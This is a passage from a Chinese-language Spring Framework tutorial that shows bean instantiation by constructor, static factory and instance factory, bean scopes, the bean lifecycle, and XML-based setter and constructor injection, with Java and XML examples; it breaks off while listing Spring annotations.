<h2 id="1、构造器实例化"><a href="#1、构造器实例化" class="headerlink" title="1、构造器实例化"></a>1、构造器实例化</h2><p>构造器实例化是指 Spring 容器通过 Bean 对应的类中默认的构造函数实例化 Bean。下面通过案例演示如何使用构造器实例化 Bean。</p>
<p>1）创建项目并添加依赖</p>
<p>2）创建实体类</p>
<p>在项目的 src 目录下创建一个名为 com.mengma.instance.constructor 的包，在该包下创建一个实体类 Person1，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.instance.constructor;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person1</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4）创建 Spring 配置文件</p>
<p>在 com.mengma.instance.constructor 包下创建 Spring 的配置文件 applicationContext.xml，编辑后如下所示。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.2.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"person1"</span> <span class="attr">class</span>=<span class="string">"com.mengma.instance.constructor.Person1"</span> /&gt;</span>	<span class="comment">&lt;!-- 建立容器声明 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>4）创建测试类</p>
<p>在 com.mengma.instance.constructor 包下创建一个名为 InstanceTest1 的测试类，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.instance.constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstanceTest1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 定义Spring配置文件的路径</span></span><br><span class="line">        String xmlPath = <span class="string">"com/mengma/instance/constructor/ApplicationContext.xml"</span>;</span><br><span class="line">        <span class="comment">// 初始化Spring容器，加载配置文件，并对bean进行实例化</span></span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">                xmlPath);</span><br><span class="line">        <span class="comment">// 通过容器获取id为person1的实例</span></span><br><span class="line">        System.out.println(applicationContext.getBean(<span class="string">"person1"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2、静态工厂方式实例化"><a href="#2、静态工厂方式实例化" class="headerlink" title="2、静态工厂方式实例化"></a>2、静态工厂方式实例化</h2><p>在 Spring 中，也可以使用静态工厂的方式实例化 Bean。此种方式需要提供一个静态工厂方法创建 Bean 的实例。下面通过案例演示如何使用静态工厂方式实例化 Bean。</p>
<p>1）创建实体类</p>
<p>在项目的 src 目录下创建一个名为 com.mengma.instance.static_factory 的包，并在该包下创建一个实体类 Person2，该类与 Person1 相同，不需要添加任何成员。</p>
<p>2）创建静态工厂类</p>
<p>在 com.mengma.instance.static_factory 包下创建一个名为 MyBeanFactory 的类，并在该类中创建一个名为 createBean() 的静态方法，用于创建 Bean 的实例，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.instance.static_factory;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBeanFactory</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建Bean实例的静态工厂方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Person2 <span class="title">createBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Person2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）创建 Spring 配置文件</p>
<p>在 com.mengma.instance.static_factory 包下创建 Spring 的配置文件 applicationContext.xml，编辑后如下所示。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.2.xsd"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- class 属性指定了其对应的工厂实现类为 MyBeanFactory，而 factory-method 属性用于告诉 Spring 容器调用工厂类中的 createBean() 方法获取 Bean 的实例。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"person2"</span> <span class="attr">class</span>=<span class="string">"com.mengma.instance.static_factory.MyBeanFactory"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">factory-method</span>=<span class="string">"createBean"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>4）创建测试类</p>
<p>在 com.mengma.instance.static_factory 包下创建一个名为 InstanceTest2 的测试类，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.instance.static_factory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstanceTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 定义Spring配置文件的路径</span></span><br><span class="line">        String xmlPath = <span class="string">"com/mengma/instance/static_factory/applicationContext.xml"</span>; <span class="comment">// 初始化Spring容器，加载配置文件，并对bean进行实例化</span></span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">                xmlPath);</span><br><span class="line">        <span class="comment">// 通过容器获取id为person2实例</span></span><br><span class="line">        System.out.println(applicationContext.getBean(<span class="string">"person2"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3、实例工厂方式实例化"><a href="#3、实例工厂方式实例化" class="headerlink" title="3、实例工厂方式实例化"></a>3、实例工厂方式实例化</h2><p>在 Spring 中，还有一种实例化 Bean 的方式就是采用实例工厂。在这种方式中，工厂类不再使用静态方法创建 Bean 的实例，而是直接在成员方法中创建 Bean 的实例。</p>
<p>同时，在配置文件中，需要实例化的 Bean 也不是通过 class 属性直接指向其实例化的类，而是通过 factory-bean 属性配置一个实例工厂，然后使用 factory-method 属性确定使用工厂中的哪个方法。下面通过案例演示实例工厂方式的使用。</p>
<p>1）创建实体类</p>
<p>在项目的 src 目录下创建一个名为 com.mengma.instance.factory 的包，在该包下创建一个 Person3 类，该类与 Person1 类相同，不需要添加任何成员。</p>
<p>2）创建实例工厂类</p>
<p>在 com.mengma.instance.factory 包下创建一个名为 MyBeanFactory 的类，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.instance.factory;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBeanFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyBeanFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"person3工厂实例化中"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建Bean的方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Person3 <span class="title">createBean</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Person3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）创建 Spring 配置文件</p>
<p>在 com.mengma.instance.factory 包下创建 Spring 的配置文件 applicationContext.xml，如下所示。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.2.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 配置实例工厂 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"myBeanFactory"</span> <span class="attr">class</span>=<span class="string">"com.mengma.instance.factory.MyBeanFactory"</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- factory-bean属性指定一个实例工厂，factory-method属性确定使用工厂中的哪个方法 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"person3"</span> <span class="attr">factory-bean</span>=<span class="string">"myBeanFactory"</span> <span class="attr">factory-method</span>=<span class="string">"createBean"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>4）创建测试类</p>
<p>在 com.mengma.instance.factory 包下创建一个名为 InstanceTest3 的测试类，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.instance.factory;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstanceTest3</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 定义Spring配置文件的路径</span></span><br><span class="line">        String xmlPath = <span class="string">"com/mengma/instance/factory/applicationContext.xml"</span>; <span class="comment">// 初始化Spring容器，加载配置文件，并对bean进行实例化</span></span><br><span class="line">        <span class="comment">// 初始化Spring容器，加载配置文件，并对bean进行实例化</span></span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">                xmlPath);</span><br><span class="line">        <span class="comment">// 通过容器获取id为person3实例</span></span><br><span class="line">        System.out.println(applicationContext.getBean(<span class="string">"person3"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Ⅸ、Spring中Bean的作用域"><a href="#Ⅸ、Spring中Bean的作用域" class="headerlink" title="Ⅸ、Spring中Bean的作用域"></a>Ⅸ、Spring中Bean的作用域</h1><p>本节先简单介绍了 Spring 中 bean 的 5 种作用域，然后详细介绍 singleton 和 prototype 这两种最常用的作用域。</p>
<h2 id="1、作用域的种类"><a href="#1、作用域的种类" class="headerlink" title="1、作用域的种类"></a>1、作用域的种类</h2><p>Spring 容器在初始化一个 Bean 的实例时，同时会指定该实例的作用域。Spring3 为 Bean 定义了五种作用域，具体如下。</p>
<p>1）<strong>singleton</strong></p>
<p>单例模式，使用 singleton 定义的 Bean 在 Spring 容器中只有一个实例，这也是 Bean 默认的作用域。</p>
<p>2）<strong>prototype</strong></p>
<p>原型模式，每次通过 Spring 容器获取 prototype 定义的 Bean 时，容器都将创建一个新的 Bean 实例。</p>
<p>3）<strong>request</strong></p>
<p>在一次 HTTP 请求中，容器会返回该 Bean 的同一个实例。而对不同的 HTTP 请求，会返回不同的实例，该作用域仅在当前 HTTP Request 内有效。</p>
<p>4）<strong>session</strong></p>
<p>在一次 HTTP Session 中，容器会返回该 Bean 的同一个实例。而对不同的 HTTP 请求，会返回不同的实例，该作用域仅在当前 HTTP Session 内有效。</p>
<p>5）<strong>global Session</strong></p>
<p>在一个全局的 HTTP Session 中，容器会返回该 Bean 的同一个实例。该作用域仅在使用 portlet context 时有效。</p>
<p>在上述五种作用域中，singleton 和 prototype 是最常用的两种，接下来将对这两种作用域进行详细讲解。</p>
<h2 id="2、singleton-作用域"><a href="#2、singleton-作用域" class="headerlink" title="2、singleton 作用域"></a>2、singleton 作用域</h2><p>singleton 是 Spring 容器默认的作用域，当一个 Bean 的作用域为 singleton 时，Spring 容器中只会存在一个共享的 Bean 实例，并且所有对 Bean 的请求，只要 id 与该 Bean 定义相匹配，就只会返回 Bean 的同一个实例。</p>
<p>通常情况下，这种单例模式对于无会话状态的 Bean（如 DAO 层、Service 层）来说，是最理想的选择。</p>
<p>在 Spring 配置文件中，可以使用 <bean> 元素的 scope 属性，将 Bean 的作用域定义成 singleton，其配置方式如下所示：</bean></p>
<p><code>&lt;bean id=&quot;person&quot; class=&quot;com.mengma.scope.Person&quot; scope=&quot;singleton&quot;/&gt;</code></p>
<p>获取并输出 id 为 person 的实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(applicationContext.getBean(<span class="string">"person"</span>));</span><br><span class="line">System.out.println(applicationContext.getBean(<span class="string">"person"</span>));</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/01/23/fwKTV1S5DA3Bx7q.png" alt="image-20210102153029083"></p>
<h2 id="3、prototype-作用域"><a href="#3、prototype-作用域" class="headerlink" title="3、prototype 作用域"></a>3、prototype 作用域</h2><p>使用 prototype 作用域的 Bean 会在每次请求该 Bean 时都会创建一个新的 Bean 实例。因此对需要保持会话状态的 Bean（如 Struts2 的 Action 类）应该使用 prototype 作用域。</p>
<p>在 Spring 配置文件中，要将 Bean 定义为 prototype 作用域，只需将 <bean> 元素的 scope 属性值定义成 prototype，其示例代码如下所示：</bean></p>
<p><code>&lt;bean id=&quot;person&quot; class=&quot;com.mengma.scope.Person&quot; scope=&quot;prototype&quot;/&gt;</code></p>
<p>再次输出：</p>
<p><img data-src="https://i.loli.net/2021/01/23/wBuz4mUqPV8hIib.png" alt="image-20210102153132317"></p>
<h1 id="Ⅹ、Spring-Bean的生命周期"><a href="#Ⅹ、Spring-Bean的生命周期" class="headerlink" title="Ⅹ、Spring Bean的生命周期"></a>Ⅹ、Spring Bean的生命周期</h1><p>Spring 容器可以管理 singleton 作用域 Bean 的生命周期，在此作用域下，Spring 能够精确地知道该 Bean 何时被创建，何时初始化完成，以及何时被销毁。</p>
<p>而对于 prototype 作用域的 Bean，Spring 只负责创建，当容器创建了 Bean 的实例后，Bean 的实例就交给客户端代码管理，Spring 容器将不再跟踪其生命周期。每次客户端请求 prototype 作用域的 Bean 时，Spring 容器都会创建一个新的实例，并且不会管那些被配置成 prototype 作用域的 Bean 的生命周期。</p>
<p>了解 Spring 生命周期的意义就在于，可以利用 Bean 在其存活期间的指定时刻完成一些相关操作。这种时刻可能有很多，但一般情况下，会在 Bean 被初始化后和被销毁前执行一些相关操作。</p>
<p>在 Spring 中，Bean 的生命周期是一个很复杂的执行过程，我们可以利用 Spring 提供的方法定制 Bean 的创建过程。</p>
<p>当一个 Bean 被加载到 Spring 容器时，它就具有了生命，而 Spring 容器在保证一个 Bean 能够使用之前，会进行很多工作。Spring 容器中 Bean 的生命周期流程如图所示。</p>
<p><img data-src="https://i.loli.net/2021/01/23/7m1aJudn2UzGiqO.png" alt="Bean的生命周期"></p>
<h2 id="Bean-生命周期的整个执行过程描述"><a href="#Bean-生命周期的整个执行过程描述" class="headerlink" title="Bean 生命周期的整个执行过程描述"></a>Bean 生命周期的整个执行过程描述</h2><p>1）根据配置情况调用 Bean 构造方法或工厂方法实例化 Bean。</p>
<p>2）利用依赖注入完成 Bean 中所有属性值的配置注入。</p>
<p>3）如果 Bean 实现了 BeanNameAware 接口，则 Spring 调用 Bean 的 setBeanName() 方法传入当前 Bean 的 id 值。</p>
<p>4）如果 Bean 实现了 BeanFactoryAware 接口，则 Spring 调用 setBeanFactory() 方法传入当前工厂实例的引用。</p>
<p>5）如果 Bean 实现了 ApplicationContextAware 接口，则 Spring 调用 setApplicationContext() 方法传入当前 ApplicationContext 实例的引用。</p>
<p>6）如果 BeanPostProcessor 和 Bean 关联，则 Spring 将调用该接口的预初始化方法 postProcessBeforeInitialzation() 对 Bean 进行加工操作，此处非常重要，Spring 的 AOP 就是利用它实现的。</p>
<p>7）如果 Bean 实现了 InitializingBean 接口，则 Spring 将调用 afterPropertiesSet() 方法。</p>
<p>8）如果在配置文件中通过 init-method 属性指定了初始化方法，则调用该初始化方法。</p>
<p>9）如果 BeanPostProcessor 和 Bean 关联，则 Spring 将调用该接口的初始化方法 postProcessAfterInitialization()。此时，Bean 已经可以被应用系统使用了。</p>
<p>10）如果在 <bean> 中指定了该 Bean 的作用范围为 scope=”singleton”，则将该 Bean 放入 Spring IoC 的缓存池中，将触发 Spring 对该 Bean 的生命周期管理；如果在 <bean> 中指定了该 Bean 的作用范围为 scope=”prototype”，则将该 Bean 交给调用者，调用者管理该 Bean 的生命周期，Spring 不再管理该 Bean。</bean></bean></p>
<p>11）如果 Bean 实现了 DisposableBean 接口，则 Spring 会调用 destory() 方法将 Spring 中的 Bean 销毁；如果在配置文件中通过 destory-method 属性指定了 Bean 的销毁方法，则 Spring 将调用该方法对 Bean 进行销毁。</p>
<p>Spring 为 Bean 提供了细致全面的生命周期过程，通过实现特定的接口或 <bean> 的属性设置，都可以对 Bean 的生命周期过程产生影响。虽然可以随意配置 <bean> 的属性，但是建议不要过多地使用 Bean 实现接口，因为这样会导致代码和 Spring 的聚合过于紧密。</bean></bean></p>
<h1 id="ⅩⅠ、Spring基于XML装配Bean"><a href="#ⅩⅠ、Spring基于XML装配Bean" class="headerlink" title="ⅩⅠ、Spring基于XML装配Bean"></a>ⅩⅠ、Spring基于XML装配Bean</h1><p>Bean 的装配可以理解为依赖关系注入，Bean 的装配方式也就是 Bean 的依赖注入方式。Spring 容器支持多种形式的 Bean 的装配方式，如基于 XML 的 Bean 装配、基于 Annotation 的 Bean 装配和自动装配等。</p>
<p>Spring 基于 XML 的装配通常采用两种实现方式，即设值注入（Setter Injection）和构造注入（Constructor Injection）。本节将讲解如何在 XML 配置文件中使用这两种注入方式。</p>
<p>在 Spring 实例化 Bean 的过程中，首先会调用默认的构造方法实例化 Bean 对象，然后通过 Java 的反射机制调用 setXxx() 方法进行属性的注入。因此，设值注入要求一个 Bean 的对应类必须满足以下两点要求。</p>
<ul>
<li>必须提供一个默认的无参构造方法。</li>
<li>必须为需要注入的属性提供对应的 setter 方法。</li>
</ul>
<p>使用设值注入时，在 Spring 配置文件中，需要使用 <bean> 元素的子元素 <property> 元素为每个属性注入值。而使用构造注入时，在配置文件中，主要使用 <constructor-arg> 标签定义构造方法的参数，可以使用其 value 属性（或子元素）设置该参数的值。下面通过案例演示基于 XML 方式的 Bean 的装配。</constructor-arg></property></bean></p>
<p>1）创建 Person 类</p>
<p>在项目 springDemo02 中的 src 目录下，创建一个名称为 com.mengma.assembly 的包，在该包下创建一个 Person 类，如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.assembly;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写toString()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person[name="</span> + name + <span class="string">",age="</span> + age + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 默认无参的构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有参的构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上述代码中，定义了 name 和 age 两个属性，并为其提供了 getter 和 setter 方法，由于要使用构造注入，所以需要提供有参的构造方法。为了能更清楚地看到输出结果，这里还重写了 toString() 方法。</p>
<p>2）创建 Spring 配置文件</p>
<p>在 com.mengma.assembly 包下创建一个名为 applicationContext.xml 的配置文件，如下所示。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.2.xsd"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用设值注入方式装配Person实例 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"person1"</span> <span class="attr">class</span>=<span class="string">"com.mengma.assembly.Person"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"zhangsan"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">value</span>=<span class="string">"20"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用构造方法装配Person实例 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"person2"</span> <span class="attr">class</span>=<span class="string">"com.mengma.assembly.Person"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"0"</span> <span class="attr">value</span>=<span class="string">"lisi"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">"1"</span> <span class="attr">value</span>=<span class="string">"21"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>上述代码中，首先使用了设值注入方式装配 Person 类的实例，其中 <property> 子元素用于调用 Bean 实例中的 setXxx() 方法完成属性赋值。然后使用了构造方式装配了 Person 类的实例，其中 <constructor-arg> 元素用于定义构造方法的参数，其属性 index 表示其索引（从 0 开始），value 属性用于设置注入的值。</constructor-arg></property></p>
<p>3）创建测试类</p>
<p>在 com.mengma.assembly 包下创建一个名称为 XmlBeanAssemblyTest 的测试类，编辑后如下所示。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mengma.assembly;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XmlBeanAssemblyTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 定义Spring配置文件路径</span></span><br><span class="line">        String xmlPath = <span class="string">"com/mengma/assembly/applicationContext.xml"</span>;</span><br><span class="line">        <span class="comment">// 初始化Spring容器，加载配置文件，并对bean进行实例化</span></span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(</span><br><span class="line">                xmlPath);</span><br><span class="line">        <span class="comment">// 设值方式输出结果</span></span><br><span class="line">        System.out.println(applicationContext.getBean(<span class="string">"person1"</span>));</span><br><span class="line">        <span class="comment">// 构造方式输出结果</span></span><br><span class="line">        System.out.println(applicationContext.getBean(<span class="string">"person2"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>上述代码中，分别获取并输出了 id 为 person1 和 person2 的实例。</p>
<p>4）运行项目并查看结果</p>
<p><img data-src="https://i.loli.net/2021/01/23/jsVSxkYZBWuFcpf.png" alt="image-20210102160034739"></p>
<h1 id="ⅩⅡ、Spring基于Annotation装配Bean"><a href="#ⅩⅡ、Spring基于Annotation装配Bean" class="headerlink" title="ⅩⅡ、Spring基于Annotation装配Bean"></a>ⅩⅡ、Spring基于Annotation装配Bean</h1><p>在 Spring 中，尽管使用 XML 配置文件可以实现 Bean 的装配工作，但如果应用中 Bean 的数量较多，会导致 XML 配置文件过于臃肿，从而给维护和升级带来一定的困难。</p>
<p>Java 从 JDK 5.0 以后，提供了 Annotation（注解）功能，Spring 也提供了对 Annotation 技术的全面支持。Spring3 中定义了一系列的 Annotation（注解），常用的注解如下。</p>
<p>1）@Component</p>
<p>可以使用此注解描述 Spring 中的 Bean，但它是一个泛化的概念，仅仅表示一个组件（Bean），并且可以作用在任何层次。使用时只需将该注解标注在相应类上即可。</p>
<p>2）@Repository</p>
<p>用于将数据访问层（DAO层）的类标识为 Spring 中的 Bean，其功能与 @Component 相同。</p>
<p>3）@Service</p>
<p>通常作用在业务层（Service 层），用于将业务层的类标识为 Spring 中的 Bean，其功能与 @Component 相同。</p>
<p>4）@Controller</p>
<p>通常作用在控制层（如 Struts2 的 Action），用于将控制层的类标识为 Spring 中的 Bean，其功能与 @Component 相同。</p>
<p>5）@Autowired</p>
<p>用于对 Bean 的属性变量、属性的 Set 方法及构造函数进行标注，配合对应的注解处理器完成 Bean 的自动配置工作。默认按照 Bean 的类型进行装配。</p>
<p>6）@Resource</p>
